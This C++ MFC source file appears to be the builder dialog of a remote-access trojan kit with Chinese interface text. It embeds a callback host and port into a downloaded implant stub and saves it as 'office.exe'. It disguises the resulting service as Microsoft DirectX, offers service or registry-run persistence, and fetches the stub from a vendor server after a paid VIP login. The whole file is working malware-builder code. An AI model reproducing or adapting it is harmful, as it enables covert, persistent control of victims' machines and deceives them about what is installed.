// Build.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Build.h"
#include "encode.h"
#include "TabView.h"
#include "MD5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CTabView* g_pTabView; 
/////////////////////////////////////////////////////////////////////////////
// CBuild dialog


CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialog(CBuild::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuild)
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", FALSE);
	//}}AFX_DATA_INIT
}


void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuild)
	DDX_Control(pDX, IDC_BIAOZHI, m_biaozhi);
	DDX_Control(pDX, IDC_INSTALL_WAY, m_insatll_way);
	DDX_Control(pDX, IDC_EDIT_SVCNAME, m_svcname);
	DDX_Control(pDX, IDC_EDIT_SHELP, m_shelp);
	DDX_Control(pDX, IDC_EDIT_SCNAME, m_scname);
	DDX_Control(pDX, IDC_VERSION, m_version);
	DDX_Control(pDX, IDC_PORT, m_port);
	DDX_Control(pDX, IDC_DNS, m_dns);
	DDX_Control(pDX, IDC_ONLINE_GROUP, m_online_group);
	DDX_Check(pDX, IDC_GREEN, m_green);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
	//{{AFX_MSG_MAP(CBuild)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_CBN_SELCHANGE(IDC_INSTALL_WAY, OnSelchangeInstallWay)
	ON_BN_CLICKED(IDC_TEST, OnTest)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuild message handlers
char *StrAdd()	// GetVolumeInformation + GetComputerName
{
	LPCTSTR   new_name = "hbturkey";
	LPTSTR    pcname   = new   char[256];
	LPDWORD   nSize    = new   unsigned   long(256);
	BOOL   nRet=GetComputerName(pcname,nSize);
	
	CString strValue       = _T("");
	//LPTSTR   lpBuffer=new   char[256];
	//获得驱动器序列号   
	LPCTSTR   lpRootPathName   =   "C:\\";   
	LPTSTR   lpVolumeNameBuffer=new   char[12];   
	DWORD   nVolumeNameSize=12;   
	DWORD   VolumeSerialNumber;   
	DWORD   MaximumComponentLength;   
	DWORD   FileSystemFlags;   
	LPTSTR   lpFileSystemNameBuffer=new   char[10];   
	DWORD   nFileSystemNameSize=10;   
	GetVolumeInformation(lpRootPathName,lpVolumeNameBuffer,nVolumeNameSize,&VolumeSerialNumber,     
		&MaximumComponentLength,&FileSystemFlags,lpFileSystemNameBuffer,nFileSystemNameSize);   
	//显示驱动器序列号   
	CString   str;   
	//str.Format("驱动器%s的序列号为%x",lpRootPathName,VolumeSerialNumber);
	str.Format("%x",VolumeSerialNumber);
    char *lpBuffer = str.GetBuffer(str.GetLength() + 1);
    str.ReleaseBuffer();
	//::MessageBox(0,lpBuffer,"GetVolumeInformation",MB_ICONINFORMATION);
	//::MessageBox(0,pcname,"GetComputerName",MB_ICONINFORMATION);
	strcat(lpBuffer, pcname);
	//::MessageBox(0,lpBuffer,"GetVolumeInformation + GetComputerName",MB_ICONINFORMATION);
	return lpBuffer;
}

BOOL CBuild::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	if (m_bFirstShow)
	{
//		CString IP;
//		
//		char hostname[256]; 
//		gethostname(hostname, sizeof(hostname));
//		HOSTENT *host = gethostbyname(hostname);
//		if (host != NULL)
//			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
//		else
// 			IP = _T("127.0.0.1");	
		
		UpdateData(false);
		
		char chSvcName[128]={0},chSvcnName[128]={0},chHelpName[128]={0};
		wsprintf(chSvcName,"DirectX %c%c%c",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chSvcnName,"DirectX Remover %c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chHelpName,"Microsoft(R) DirectX %c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);

		SetDlgItemText(IDC_DNS,  ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "域名已绑定请登陆", "域名已绑定请登陆"));
		SetDlgItemText(IDC_PORT, ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "PORT", "81"));
		SetDlgItemText(IDC_VERSION, ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Version", "土豪金"));
		SetDlgItemText(IDC_EDIT_SVCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceName", chSvcName));
		SetDlgItemText(IDC_EDIT_SCNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DisplayName", chSvcnName));
		SetDlgItemText(IDC_EDIT_SHELP,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Description", chHelpName));
	}

	m_bFirstShow = false;
	
	UpdateData(false);
	
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_online_group.AddString(strGroupName);
	}
	m_online_group.SetCurSel(0);
	m_insatll_way.SetCurSel(0);
	
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", m_green);
	if ( ((CButton *)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE )
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	}

	GetDlgItem(IDC_BIAOZHI)->SetWindowText(MD5String(StrAdd()));

	UpdateData(false);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

MODIFY_DATA modify_data = 
{
	"           D         ",
		"",
		"",
		"",
		"",
		"",
		"",
		"",
		TRUE,			//TRUE为服务启动
		TRUE,			//TRUE为双启动
		TRUE,			//FALSE为安装,TRUE为绿色安装
};

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

CString SHANGXIANXINXI;
void CBuild::OnBuild() 
{
	// TODO: Add your control notification handler code here
	CString strHost, strPort, strGroup, strVersion, strSer, strSerDis, strSerDes, strGetGroupName;
	
	GetDlgItem(IDC_DNS)->GetWindowText(strHost);
	GetDlgItem(IDC_PORT)->GetWindowText(strPort);
	GetDlgItem(IDC_VERSION)->GetWindowText(strVersion);

	GetDlgItem(IDC_EDIT_SVCNAME)->GetWindowText(strSer);
	GetDlgItem(IDC_EDIT_SCNAME)->GetWindowText(strSerDis);
	GetDlgItem(IDC_EDIT_SHELP)->GetWindowText(strSerDes);

	GetDlgItem(IDC_BIAOZHI)->GetWindowText(strGetGroupName);

	if (strHost.IsEmpty() || strPort.IsEmpty() )
	{
		AfxMessageBox("请完整填写上线地址或者端口");
		return;
	}

	((CComboBox*)GetDlgItem(IDC_ONLINE_GROUP))->GetWindowText(strGroup);
	if (strGroup.IsEmpty())
	{
		AfxMessageBox("请完整填写分组名");
		return;
	}

	CString OnInstallWay;
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if(!m_green)
	{
		if (OnInstallWay == "服务启动")
		{
			if (strSer.IsEmpty() || strSerDis.IsEmpty() || strSerDes.IsEmpty() )
			{
				AfxMessageBox("请完整填写服务启动信息");
				return;
			}
		}
	}

	ZeroMemory(&modify_data,sizeof(MODIFY_DATA));
	strcpy(modify_data.szDns,MyEncode(strHost.GetBuffer(0)));
	strcpy(modify_data.dwPort,MyEncode(strPort.GetBuffer(0)));
	strcpy(modify_data.szGroup,MyEncode(strGroup.GetBuffer(0)));
	strcpy(modify_data.szVersion,MyEncode(strVersion.GetBuffer(0)));
	strcpy(modify_data.SerName, strSer.GetBuffer(0));
	strcpy(modify_data.Serdisplay, strSerDis.GetBuffer(0));
	strcpy(modify_data.Serdesc, strSerDes.GetBuffer(0));
	strcpy(modify_data.szGetGroup, strGetGroupName.GetBuffer(0));

	if (OnInstallWay == "服务启动")
	{
		m_Servers = TRUE;
		m_RunUP = FALSE;
		modify_data.bServer = m_Servers;
		modify_data.bRuns = m_RunUP;
	}

	if (OnInstallWay == "注册表启动项")
	{
		m_Servers = FALSE;
		m_RunUP = TRUE;
		modify_data.bServer = m_Servers;
		modify_data.bRuns = m_RunUP;
	}

	modify_data.bRunOnce = m_green;

	CFileDialog dlg(FALSE, "exe", "office.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	
	CHAR DatPath[MAX_PATH];
		
		GetModuleFileName( NULL, DatPath, sizeof(DatPath) );
		*strrchr( DatPath, '\\' ) = '\0';
		lstrcat( DatPath, "\\Cache\\Install.dat" );
		
	CFile file;
	BYTE *rstdata;
	DWORD dwSize,dwWritten;
	HANDLE hUpdateRes;
	BOOL result;
	HANDLE hFile9;
	LPBYTE p;
	file.Open(DatPath, CFile::modeRead);
	dwSize=file.GetLength();        
	rstdata=new BYTE[dwSize];
	file.ReadHuge(rstdata, dwSize);
	file.Close();
	
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		return ;
	}
	
	CopyMemory((LPVOID)p, (LPCVOID)rstdata, dwSize);
	
	char *dksD="           D         ";
	int iPosD = MemFindStr((const char *)p, dksD, dwSize, strlen(dksD));
	CopyMemory((LPVOID)(p + iPosD), (LPCVOID)&modify_data,sizeof(MODIFY_DATA));
	
	HANDLE hFile;
	hFile = CreateFile(dlg.GetPathName(),GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile == NULL) 
	{
		DeleteFile(dlg.GetPathName());
		MessageBox("文件保存失败，请检查","提示",MB_OK|MB_ICONSTOP);
		return;
	}
	
	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
	if(hFile)
		CloseHandle(hFile);
	
	if(rstdata)
		GlobalFree(rstdata);
	if(p)
		GlobalFree(p);
	
	//保存配置信息
//	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Dns", strHost);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", strVersion);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Port", strPort);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Green", m_green);

	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", strSer);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", strSerDis);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", strSerDes);

	MessageBox("文件保存成功!","提示", MB_ICONINFORMATION);
}

void CBuild::OnGreen() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	if(m_green)
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		OnSelchangeInstallWay();
	}
	UpdateData(FALSE);
}

void CBuild::OnSelchangeInstallWay() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	CString OnInstallWay;
	
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if (OnInstallWay == "服务启动")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	}
	if (OnInstallWay=="注册表启动项")
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	}
	UpdateData(FALSE);
}
/////////网络信息获取////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11
typedef struct
{
	
	BYTE	Flags;
	DWORD	Buffer_Size;
	BYTE	Buffer[1024];
	BYTE	Info[256];
}NET_DATA, *LPNET_DATA;
void CBuild::OnTest() 
{
	// TODO: Add your control notification handler code here
	DeleteFile("Cache\\Install.dat");
	char zhanghao[50];
	char mima[50];
	GetDlgItemText(IDC_VipName,zhanghao,sizeof(zhanghao));
	GetDlgItemText(IDC_VipPass,mima,sizeof(mima));
	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
	{
		MessageBox("请填写Vip账号\\Vip密码","错误",NULL);
	    return;
	}
	// TODO: Add your control notification handler code here
	char TmpPath[MAX_PATH];
	GetTempPath( sizeof(TmpPath), TmpPath );
	lstrcatA( TmpPath, "\\WindsTemp.exe" );
	DeleteFile(TmpPath);
	DWORD recvsize = 0;
	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	//struct hostent *hp;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//创建SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		AfxMessageBox("socket error!\n");
		WSACleanup();
		return;
	}
	
	//获取服务器IP和端口
	serverAddr.sin_family = AF_INET;
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;	
    char gaigaigai[] = {'a','a','a','z','j','y','1','2','3','.','v','i','c','p','.','c','c','\0'};
	if ((hp = gethostbyname("www.3800cc.org")) != NULL)
//	if ((hp = gethostbyname(gaigaigai)) != NULL)
//	if ((hp = gethostbyname("115.47.38.83")) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));
	}
	
	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(3010);
	
	//连接服务
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		AfxMessageBox("连接服务器失败!\n");
		WSACleanup();
		return;
	}
	char USERIMFOR[256] = {0}, buff[256] = {0};
	wsprintf( USERIMFOR, "Login:%s@%s",zhanghao,mima);
	
	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
		AfxMessageBox("发送数据失败!\n");
		WSACleanup();
		return;
	}
	
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		AfxMessageBox("登录失败!可能导致的原因：1.您的生成次数或日期已经用完  2.您删除了登陆的INI文件，导致无法读取用户名和密码  3.请尝试重新打开本软件，如果还不行请咨询客服");
		WSACleanup();
		return;
	}
	if ( strstr( buff, "Pass" ) != NULL )//通过验证
	{	
		if ( GetFileAttributes(TmpPath) != -1 )
		{
			AfxMessageBox("File is exist and can't delete!");
			WSACleanup();
			return;
		}
		
		NET_DATA MyData;
		DWORD dwBytes;
		HANDLE hFile = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = Request_DOWN;
		char *laji = "48f9648";
		
		if ( mima != 0 )
		{
			lstrcpy( (char*)&request[1],mima );
		}
		send( sockInt, (char*)&request, sizeof(request), NULL );
		while (1)
		{
			memset( &MyData, 0, sizeof(NET_DATA) );
			Ret = recv( sockInt, (char*)&MyData, sizeof(MyData), NULL );
			if ( Ret == 0 || Ret == SOCKET_ERROR )
			{
				AfxMessageBox("获取文件出错!");
				CloseHandle(hFile);
				WSACleanup();
				return;
			}
			if ( MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer ) break;
			SHANGXIANXINXI = MyData.Info;
			WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
			recvsize += MyData.Buffer_Size;
			send( sockInt, laji, lstrlen(laji) + 1, NULL );
			if ( MyData.Flags == File_Buffer_Finish ) break;
		}
		CloseHandle(hFile);
	}
	else
	{
		WSACleanup();
		return;
	}
	//关闭SOCK
	closesocket(sockInt);
	WSACleanup();
	MoveFileA(TmpPath,"Cache\\Install.dat");

	SetDlgItemText(IDC_DNS,SHANGXIANXINXI);
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	GetDlgItem(IDC_TEST)->EnableWindow(FALSE);
}

